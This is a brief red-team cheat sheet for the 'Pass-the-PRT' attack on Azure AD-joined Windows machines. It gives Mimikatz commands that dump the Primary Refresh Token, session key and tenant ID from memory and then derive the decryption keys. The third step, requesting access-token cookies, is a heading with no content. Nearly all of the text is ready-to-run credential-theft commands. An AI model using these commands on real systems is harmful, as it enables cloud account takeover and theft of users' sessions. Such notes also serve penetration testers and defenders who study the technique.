# Pass-the-Primary Refresh Token (PRT)

## Steps

#### 1) Extract PRT, Session Key (KeyValue), and Tenant ID

    Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::cloudap" ""exit"'

#### 2) Extract Context Key, ClearKey, and Derived Key

    Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "dpapi::cloudapkd /keyvalue:<KEY VALUE> /unprotect" "exit"'

#### 3) Request Access Token (Cookie) to All Applications

